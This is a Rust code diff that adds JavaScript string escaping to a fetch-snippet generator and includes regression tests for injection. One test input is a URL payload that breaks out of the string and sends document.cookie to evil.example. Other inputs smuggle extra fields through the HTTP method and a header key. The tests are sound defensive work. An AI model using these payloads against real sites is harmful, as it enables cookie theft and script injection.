@@ -12,12 +12,16 @@ pub fn generate_javascript(request: &CodegenRequest) -> String {
 
     // Options object
     lines.push("const options = {".to_string());
-    lines.push(format!("  method: '{}',", request.method));
+    lines.push(format!("  method: '{}',", escape_js_string(&request.method)));
 
     if has_headers {
         lines.push("  headers: {".to_string());
         for (key, value) in &request.headers {
-            lines.push(format!("    '{}': '{}',", key, escape_js_string(value)));
+            lines.push(format!(
+                "    '{}': '{}',",
+                escape_js_string(key),
+                escape_js_string(value)
+            ));
         }
         lines.push("  },".to_string());
     }
@@ -45,7 +49,7 @@ pub fn generate_javascript(request: &CodegenRequest) -> String {
     lines.push(String::new());
 
     // Fetch call
-    lines.push(format!("fetch('{}', options)", request.url));
+    lines.push(format!("fetch('{}', options)", escape_js_string(&request.url)));
     lines.push("  .then(response => response.json())".to_string());
     lines.push("  .then(data => console.log(data))".to_string());
     lines.push("  .catch(error => console.error('Error:', error));".to_string());
@@ -123,5 +127,36 @@ mod tests {
         let code = generate_javascript(&request);
         assert!(code.contains("headers: {"));
         assert!(code.contains("'Authorization': 'Bearer token'"));
+    }
+
+    #[test]
+    fn test_url_injection_is_escaped() {
+        // A malicious URL containing a single quote could break out of the
+        // fetch() string argument and inject arbitrary JS.
+        let request = CodegenRequest::new(
+            "GET",
+            "https://example.com/'); fetch('https://evil.example/steal?d='+document.cookie); ('",
+        );
+        let code = generate_javascript(&request);
+        assert!(!code.contains(
+            "fetch('https://example.com/'); fetch('https://evil.example/steal?d='+document.cookie); ('', options)"
+        ));
+        assert!(code.contains("\\'"));
+    }
+
+    #[test]
+    fn test_method_injection_is_escaped() {
+        // HttpMethod::Custom allows arbitrary free text for the method.
+        let request = CodegenRequest::new("GET', headers: {'X-Injected", "https://example.com");
+        let code = generate_javascript(&request);
+        assert!(!code.contains("method: 'GET', headers: {'X-Injected',"));
+    }
+
+    #[test]
+    fn test_header_key_injection_is_escaped() {
+        let request = CodegenRequest::new("GET", "https://example.com")
+            .with_headers(vec![("X-Evil': 'x', 'X-Injected".to_string(), "value".to_string())]);
+        let code = generate_javascript(&request);
+        assert!(!code.contains("'X-Evil': 'x', 'X-Injected': 'value',"));
     }
 }
